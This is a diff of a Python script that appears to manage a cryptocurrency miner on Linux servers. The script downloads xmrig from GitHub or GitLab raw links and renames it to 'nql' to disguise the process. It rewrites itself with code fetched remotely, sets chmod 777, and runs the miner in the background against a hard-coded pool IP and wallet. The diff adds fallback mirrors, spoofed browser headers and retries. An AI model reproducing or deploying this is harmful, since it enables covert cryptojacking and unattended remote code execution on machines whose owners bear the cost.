@@ -40,6 +40,7 @@ if operate_system == 'lin':
         os.system('pip3 install psutil')
     except:
         pass
+
 import psutil
 
 xmrig_name = 'nql'
@@ -52,9 +53,9 @@ command_xmrig_default = '--algo randomx -o 45.8.146.102:443 -u 43ZBkWEBNvSYQDsEM
 while True:
     time.sleep(1)
     working_dir = os.path.dirname(os.path.realpath(__file__))
-    print(working_dir)
+    print(f'{working_dir}\n')
     path_app = os.path.realpath(__file__)
-    version_chinh = 5.7
+    version_chinh = 5.8
     link_version_chinh = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/config/version_vps_cpu'
     link_dao = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/config/vps_cpu.py'
 
@@ -64,18 +65,71 @@ while True:
     gz_name = 'xmrig_linux.gz'
     folder_xmrig = 'xmrig_linux'
     xmrig_name = 'nql'
+
+    verify = 'nql'
+    headers = {
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.5',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'DNT': '1',
+                'Connection': 'keep-alive',
+                'Upgrade-Insecure-Requests': '1',
+                'Sec-Fetch-Dest': 'document',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-Site': 'none',
+                'Sec-Fetch-User': '?1'
+            }
+    
+    link_verify = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/config/verify'
+    for i in range(0, 3, 1):
+        try:
+            response = requests.get(link_verify, headers=headers, timeout=timeout)
+            if response.status_code == 200:
+                verify = response.text
+                break
+        except:
+            continue
+    
+    if verify.strip() == 'OK':
+        print(f'Lay link tu github\n')
+        link_version_chinh = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/config/version_vps_cpu'
+        link_dao = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/config/vps_cpu.py'
+
+        link_version_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/version_xmrig'
+        link_download_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/xmrig_linux.gz'
+    else:
+        print('Lay link tu gitlab\n')
+        link_version_chinh = 'https://gitlab.com/nguyennhatduy26082009/giautoidi/-/raw/beta/daonhanh/config/version_vps_cpu'
+        link_dao = 'https://gitlab.com/nguyennhatduy26082009/giautoidi/-/raw/beta/daonhanh/config/vps_cpu.py'
+
+        link_version_xmrig = 'https://gitlab.com/nguyennhatduy26082009/giautoidi/-/raw/beta/daonhanh/version_xmrig'
+        link_download_xmrig = 'https://gitlab.com/nguyennhatduy26082009/giautoidi/-/raw/beta/daonhanh/xmrig_linux.gz'
+
+    for i in range(0, 3, 1):
+        try:
+            response = requests.get(link_version_chinh, headers=headers, timeout=timeout)
+            if response.status_code == 200:
+                get_version_chinh = float(response.text)
+                break
+        except:
+            continue
+
     try:
-        response = requests.get(link_version_chinh, timeout=timeout)
-        get_version_chinh = float(response.text)
-        print(get_version_chinh)
+        print(f'get_version_chinh = {get_version_chinh}\n')
         if get_version_chinh == version_chinh:
-            print('Dang o version moi nhat la %s' % version_chinh)
+            print(f'Dang o version moi nhat la {version_chinh}\n')
         else:
             if len(response.text) < 5:
-                print('Co version moi, update thoi')
-                response = requests.get(link_dao, timeout=timeout)
-                data_trave = response.text
-                #print(data_trave)
+                print('Co version moi, update thoi\n')
+                for i in range(0, 3, 1):
+                    try:
+                        response = requests.get(link_dao, headers=headers, timeout=timeout)
+                        if response.status_code == 200:
+                            data_trave = response.text
+                            break
+                    except:
+                        continue
+                    #print(data_trave)
                 if 'command_xmrig_default' in data_trave:
                     fileopen = open(path_app, 'w+')
                     fileopen.write(data_trave)
@@ -106,17 +160,16 @@ while True:
         
         try:
             if not os.path.isfile('/opt/%s/%s' %(folder_xmrig, xmrig_name)):
-                print('Chua co chuong trinh %s' %xmrig_name)
+                print(f'Chua co chuong trinh {xmrig_name}\n')
                 os.chdir('/opt')
                 os.system('rm -f /opt/%s' %gz_name)
                 os.system('wget %s' %link_download_xmrig)
                 os.system('tar xf %s' %gz_name)
                 os.chdir('/opt/%s' %folder_xmrig)
-                os.system('cp xmrig %s' %xmrig_name)
                 #workingdir = os.getcwd()
                 os.system('chmod 777 %s' %xmrig_name)
             else:
-                print('Da co chuong trinh %s' %xmrig_name)
+                print(f'Da co chuong trinh {xmrig_name}\n')
         except:
             pass
         try:
@@ -126,16 +179,22 @@ while True:
             #time.sleep(10000)
             version_tam = output.split(' ')
             version_xmrig = version_tam[1].strip()
-            print('Version xmrig la %s' %version_xmrig)
-            response = requests.get(link_version_xmrig, timeout=timeout)
-            get_version_xmrig = response.text.strip()
-            print('Version xmrig lay tren web la %s' %get_version_xmrig)
+            print(f'Version {xmrig_name} la {version_xmrig}\n')
+            for i in range(0, 3, 1):
+                try:
+                    response = requests.get(link_version_xmrig, headers = headers, timeout=timeout)
+                    if response.status_code == 200:
+                        get_version_xmrig = response.text.strip()
+                        break
+                except:
+                    continue
+            print(f'Version {xmrig_name} lay tren web la {get_version_xmrig}\n')
             #Check version uam
             if get_version_xmrig == version_xmrig and len(get_version_xmrig) < 20:
-                print('xmrig dang o phien ban moi nhat %s' %version_xmrig)
+                print(f'{xmrig_name} dang o phien ban moi nhat {version_xmrig}\n')
             if get_version_xmrig != version_xmrig and len(get_version_xmrig) < 20:
                 os.system('pkill %s' % xmrig_name)
-                print('xmrig da co phien ban moi, tien hanh update thoi')
+                print(f'{xmrig_name} da co phien ban moi, tien hanh update thoi\n')
                 os.chdir('/opt')
                 os.system('rm -f /opt/%s' %gz_name)
                 os.system('rm -rf /opt/%s' %folder_xmrig)
@@ -150,7 +209,7 @@ while True:
                 process_name = proc.as_dict(attrs=['pid', 'name', 'create_time'])
                 #print(process_name['name'])
                 if xmrig_name == process_name['name']:
-                    print('Da co chuong trinh %s chay' %xmrig_name)
+                    print(f'Da co chuong trinh {xmrig_name} chay\n')
                     xmrig_dachay = True
                     break
         except:
@@ -161,10 +220,10 @@ while True:
                 command = '/opt/%s/%s %s' %(folder_xmrig, xmrig_name, command_xmrig_default)
                 print(command)
                 if os.path.isfile('/usr/bin/screen'):
-                    print('Co chuong trinh screen')
+                    print('Co chuong trinh screen\n')
                     os.system ('screen -dmS %s %s' %(xmrig_name, command))
                 elif os.path.isfile('/usr/bin/nohup'):
-                    print('Co chuong trinh nohup')
+                    print('Co chuong trinh nohup\n')
                     os.system ('nohup %s &' %command)
                 else:
                     os.system ('%s &' %command)
